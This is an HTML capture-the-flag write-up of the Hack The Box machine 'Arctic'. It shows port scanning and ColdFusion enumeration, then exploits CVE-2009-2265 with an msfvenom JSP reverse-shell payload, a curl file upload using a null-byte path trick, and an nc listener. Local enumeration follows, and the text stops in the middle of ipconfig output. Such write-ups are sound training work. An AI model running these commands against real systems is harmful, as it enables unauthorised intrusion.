@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta description="This is an easy Windows box.">
+    
+    <title>
+        
+            Arctic | mmezirard
+        
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            Arctic<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2023-12-07</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.png"
+                src="https://mmezirard.github.io/htb-write-ups/boxes/arctic/cover.png"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#remote-enumeration">Remote enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#host-discovery">Host discovery</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#tcp-port-scanning">TCP port scanning</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#service-fingerprinting">Service fingerprinting</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#scripts">Scripts</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#adobe-coldfusion-port-8500-tcp">Adobe ColdFusion (port 8500&#x2F;tcp)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#banner-grabbing">Banner grabbing</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#browser">Browser</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#http-headers">HTTP headers</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#technology-lookup">Technology lookup</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#exploration">Exploration</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#known-cves">Known CVEs</a>
+                                            </li>
+                                        
+                                    </ul>
+                            
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#foothold-cve-2009-2265">Foothold (CVE-2009-2265)</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#preparation">Preparation</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#exploitation">Exploitation</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#local-enumeration">Local enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#version">Version</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#architecture">Architecture</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#windows-defender">Windows Defender</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#amsi">AMSI</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#firewall">Firewall</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#nics">NICs</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#local-users">Local users</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#local-groups">Local groups</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#user-account-information">User account information</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#home-folder">Home folder</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#command-history">Command history</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#tokens">Tokens</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#privilege-escalation-juicy-potato">Privilege escalation (Juicy Potato)</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#preparation-1">Preparation</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#exploitation-1">Exploitation</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#local-enumeration-1">Local enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#home-folder-1">Home folder</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/arctic/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<p><strong>OS</strong>: Windows</p>
+<p><strong>Release date</strong>: 2017-03-22</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/1">ch4p</a></p>
+<h1 id="setup">Setup</h1>
+<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great practice security-wise, but it's a VM so it's alright. This way I won't have to prefix some commands with <code>sudo</code>, which gets cumbersome in the long run. Heck, it's hard enough to remember the flags for the commands without needing to know the privileges required to run them too!</p>
+<p>I like to maintain consistency in my workflow for every box, so before starting with the actual pentest, I'll prepare a few things:</p>
+<ol>
+<li>
+<p>I'll create a directory that will contain every file related to this box. I'll call it <code>workspace</code>, and it will be located at the root of my filesystem <code>/</code>.</p>
+</li>
+<li>
+<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll run <code>httpsimpleserver</code> to create an HTTP server and <code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make files in this folder available over the Internet, which will be especially useful for transferring files to the target machine if need be!</p>
+</li>
+<li>
+<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory. This will come in handy once we get a foothold, for privilege escalation and for pivoting inside the internal network.</p>
+</li>
+</ol>
+<p>I'll also strive to minimize the use of Metasploit, because it hides the complexity of some exploits, and prefer a more manual approach when it's not too much hassle to really understand what's happening on the machine.</p>
+<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.5</code>, while the target machine's IP address will be <code>10.10.10.11</code>. The commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever need to transfer files or binaries to the target machine I'll always place them in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
+<p>Now we should be ready to go!</p>
+<h1 id="remote-enumeration">Remote enumeration</h1>
+<h2 id="host-discovery">Host discovery</h2>
+<p>Well, we already know the IP we are targeting, so this phase is actually empty!</p>
+<h2 id="tcp-port-scanning">TCP port scanning</h2>
+<p>As usual, I'll initiate a port scan on Arctic using a TCP SYN <code>nmap</code> scan to assess its attack surface.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.10.11<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT      STATE SERVICE
+</span><span class="z-text z-plain">135/tcp   open  msrpc
+</span><span class="z-text z-plain">8500/tcp  open  fmtp
+</span><span class="z-text z-plain">49154/tcp open  unknown
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h2 id="service-fingerprinting">Service fingerprinting</h2>
+<p>Following the port scan, let's gather more data about the services associated with the open ports we found.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.10.11<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> 135,8500,49154<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT      STATE SERVICE VERSION
+</span><span class="z-text z-plain">135/tcp   open  msrpc   Microsoft Windows RPC
+</span><span class="z-text z-plain">8500/tcp  open  fmtp?
+</span><span class="z-text z-plain">49154/tcp open  msrpc   Microsoft Windows RPC
+</span><span class="z-text z-plain">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Alright, so <code>nmap</code> managed to determine that Arctic is running Windows. That's good to know!</p>
+<h2 id="scripts">Scripts</h2>
+<p>Let's run <code>nmap</code>'s default scripts on these services to see if they can find additional information.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.10.11<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> 135,8500,49154<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT      STATE SERVICE
+</span><span class="z-text z-plain">135/tcp   open  msrpc
+</span><span class="z-text z-plain">8500/tcp  open  fmtp
+</span><span class="z-text z-plain">49154/tcp open  unknown
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Unfortunately, <code>nmap</code>'s scans failed to uncover more information.</p>
+<p>Let's explore the mysterious application on port <code>8500/tcp</code>!</p>
+<h2 id="adobe-coldfusion-port-8500-tcp">Adobe ColdFusion (port <code>8500/tcp</code>)</h2>
+<h3 id="banner-grabbing">Banner grabbing</h3>
+<p>Let's interact with the service using this port with <code>nc</code>. Maybe we'll get a banner to identify it?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nc 10.10.10.11 8500</span>
+</span></code></pre>
+<p>We don't... let's try to enter something.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">hello?</span></span>
+</span></code></pre>
+<p>The connection closed!</p>
+<h3 id="browser">Browser</h3>
+<p>The banner grabbing was unsuccessful, so let's assume that this is a web server. Let's browse to <code>http://10.10.10.11:8500/</code>:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/arctic/coldfusion-homepage.png" alt="ColdFusion homepage" /></p>
+<p>It hanged for an eternity, but in the end it returned a web page! It looks like a folder that we can navigate...</p>
+<h3 id="http-headers">HTTP headers</h3>
+<p>Before investigating the content of this folder, let's check out the HTTP response headers when we request the homepage.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl http://10.10.10.11:8500/<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>I</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HTTP/1.0 200 OK
+</span><span class="z-text z-plain">Date: Tue, 05 Dec 2023 23:32:50 GMT
+</span><span class="z-text z-plain">Content-Type: text/html; charset=utf-8
+</span><span class="z-text z-plain">Connection: close
+</span><span class="z-text z-plain">Server: JRun Web Server
+</span></code></pre>
+<p>The only interesting header here is <code>Server</code>, which is set to <code>JRun Web Server</code>.</p>
+<p>After a big of googling, here's what I found:</p>
+<blockquote>
+<p>JRun is a J2EE application server, originally developed in 1997 as a Java Servlet engine by Live Software and subsequently purchased by Allaire, who brought out the first J2EE compliant version. It was acquired by Macromedia prior to its 2001 takeover of Allaire, and subsequently by Adobe Systems when it bought Macromedia in 2005. Its latest patch Updater 7 was released by Adobe in 2007.</p>
+<p>— <a href="https://en.wikipedia.org/wiki/Adobe_JRun">Wikipedia</a></p>
+</blockquote>
+<p>So apparently JRun is a web application server originally developed as a Java servlet, later acquired by Adobe and discontinued in 2007.</p>
+<p>That's surprising to find it on this box! It must be vulnerable to many sorts of exploits.</p>
+<p>Anyways, now that we we know we are dealing with a server, let's proceed to its enumeration.</p>
+<h3 id="technology-lookup">Technology lookup</h3>
+<p>Before exploring this website, let's look up the technologies it uses with the <a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/arctic/coldfusion-homepage-wappalyzer.png" alt="ColdFusion homepage Wappalyzer extension" /></p>
+<p>Nothing!</p>
+<h3 id="exploration">Exploration</h3>
+<p>If we explore the tree of files we have at our disposal, we see that the <code>CFIDE</code> folder probably holds to the source code of something. We find some <code>.cfm</code> files, which correspond to Adobe ColdFusion files. So this web server must be using Adobe ColdFusion after all!</p>
+<p>In the <code>cfdocs</code> folder, we can find a <code>dochome.htm</code> file that seems to be a documentation for Adobe ColdFusion. Therefore, this folder probably holds the documentation, and we're not really interested into this at the moment.</p>
+<p>In the <code>CFIDE</code>, we find an <code>administrator</code> folder. And if we click on it, we land on this web page:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/arctic/coldfusion-administrator-page.png" alt="ColdFusion administrator page" /></p>
+<p>We can't change the username though.</p>
+<h4 id="common-passwords">Common passwords</h4>
+<p>I tried common passwords, but unfortunately it didn't work.</p>
+<h3 id="known-cves">Known CVEs</h3>
+<p>I mentioned earlier that JRun was an old and discontinued application. The web server is not running JRun though, but ColdFusion. We still find a <code>Server</code> header mentioning that it's <code>JRun</code>, so it must be a version dating back to the buyout of the product, and it must be a version published between 2005 and 2007! Hence, it's probably vulnerable to something.</p>
+<p>Let's search <a href="https://www.exploit-db.com/">ExploitDB</a> for <code>ColdFusion</code>. There's a bunch of results, but we're only really interested in RCE, so we can rule out most of the results. The <a href="https://www.exploit-db.com/exploits/50057">Adobe ColdFusion 8 - Remote Command Execution (RCE)</a> (<a href="https://nvd.nist.gov/vuln/detail/CVE-2009-2265">CVE-2009-2265</a>) result looks promising! That's around the time we estimate the ColdFusion version to have been published.</p>
+<h1 id="foothold-cve-2009-2265">Foothold (<a href="https://nvd.nist.gov/vuln/detail/CVE-2009-2265">CVE-2009-2265</a>)</h1>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2009-2265">CVE-2009-2265</a> is a vulnerability in ColdFusion 8.0.1 that allows unauthenticated users to upload files and gain remote code execution on the target host. The vulnerability is caused by a directory traversal flaw in the file browser and the <code>editor/filemanager/connectors/</code> directory, which allows anyone to create executable files in arbitrary directories, which can then be executed to get code execution.</p>
+<p>The page we found gives us a ready-made Python script to obtain a reverse shell, but I prefer a more manual approach.</p>
+<h2 id="preparation">Preparation</h2>
+<p>First, I'll setup a listener to receive the shell.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rlwrap nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> 9001</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">listening on [any] 9001 ...
+</span></code></pre>
+<p>Then I'll use <code>msfvenom</code> to create the reverse shell payload. I'll mimick the script and place it into a <code>.txt</code> file.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> msfvenom<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=9001<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> raw<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span> /workspace/revshell.txt</span>
+</span></code></pre>
+<h2 id="exploitation">Exploitation</h2>
+<p>Now let's exploit this CVE to obtain a reverse shell.</p>
+<p>The first thing to do is to upload our file on the web server. I'll send the <code>curl</code> equivalent of the script request.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>X</span> POST<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>F</span> newfile=@/workspace/revshell.txt <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&amp;Type=File&amp;CurrentFolder=/revshell.jsp%00<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span></span>
+</span></code></pre>
+<p>Let's check if the file was successfully uploaded to <code>/userfiles/file/</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/arctic/coldfusion-userfiles-folder.png" alt="ColdFusion '/userfiles/file' folder" /></p>
+<p>Great! Now let's trigger our payload.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl http://10.10.10.11:8500/userfiles/file/revshell.jsp<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span></span>
+</span></code></pre>
+<p>If we check our listener:</p>
+<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.5] from (UNKNOWN) [10.10.10.11] 49185
+</span><span class="z-text z-plain">Microsoft Windows [Version 6.1.7600]
+</span><span class="z-text z-plain">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">PS C:\ColdFusion8\runtime\bin&gt;
+</span></code></pre>
+<p>It successfully caught the reverse shell. Nice!</p>
+<p>It's a standard one though, so I'll transform it into a Powershell session.</p>
+<h1 id="local-enumeration">Local enumeration</h1>
+<p>If we run <code>whoami</code>, we see that we got a foothold as <code>tolis</code>.</p>
+<h2 id="version">Version</h2>
+<p>Let's gather some information about the Windows version of Arctic.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\ColdFusion8\runtime\bin<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> reg query <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-powershell">/</span>v ProductName
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+</span><span class="z-text z-plain">    ProductName    REG_SZ    Windows Server 2008 R2 Standard
+</span></code></pre>
+<p>Okay, so this is Windows Server 2008!</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\ColdFusion8\runtime\bin<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> reg query <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-powershell">/</span>v CurrentBuildNumber
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+</span><span class="z-text z-plain">    CurrentBuildNumber    REG_SZ    7600
+</span></code></pre>
+<p>And this is build <code>7600</code>.</p>
+<p>This version of Windows is a bit old, and maybe there are missing hotfixes. We'll check that later, if we can't find another way to get <code>NT AUTHORITY\SYSTEM</code>.</p>
+<h2 id="architecture">Architecture</h2>
+<p>What is Arctic's architecture?</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\ColdFusion8\runtime\bin<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> reg query <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-powershell">/</span>v PROCESSOR_ARCHITECTURE
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
+</span><span class="z-text z-plain">    PROCESSOR_ARCHITECTURE    REG_SZ    AMD64
+</span></code></pre>
+<p>So this system is using x64. This will be useful to know if we want to compile our own exploits.</p>
+<h2 id="windows-defender">Windows Defender</h2>
+<p>Let's check if Windows Defender is enabled.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\ColdFusion8\runtime\bin<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> reg query <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-powershell">/</span>v ProductStatus
+</span></code></pre>
+<p>There's no output, which probably means that we got an error. Let's assume it's disabled then!</p>
+<h2 id="amsi">AMSI</h2>
+<p>Let's check if there's any AMSI provider.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\ColdFusion8\runtime\bin<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> reg query <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\Providers<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<p>As for Windows Defender, there's no output.</p>
+<h2 id="firewall">Firewall</h2>
+<p>Let's see which Windows Firewall policies profiles are enabled.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\ColdFusion8\runtime\bin<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> reg query <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-powershell">/</span>s <span class="z-keyword z-operator z-assignment z-powershell">/</span>v EnableFirewall
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile
+</span><span class="z-text z-plain">    EnableFirewall    REG_DWORD    0x1
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile
+</span><span class="z-text z-plain">    EnableFirewall    REG_DWORD    0x1
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile
+</span><span class="z-text z-plain">    EnableFirewall    REG_DWORD    0x1
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">End of search: 3 match(es) found.
+</span></code></pre>
+<p>Okay, so all Firewall profiles are enabled. It shouldn't hinder our progression too much though: since we alreay managed to obtain a reverse shell, the protections should be really basic.</p>
+<h2 id="nics">NICs</h2>
+<p>Let's gather the list of connected NICs.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\ColdFusion8\runtime\bin<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> ipconfig <span class="z-keyword z-operator z-assignment z-powershell">/</span>all
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Windows IP Configuration
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Host Name . . . . . . . . . . . . : arctic
+</span><span class="z-text z-plain">   Primary Dns Suffix  . . . . . . . : 
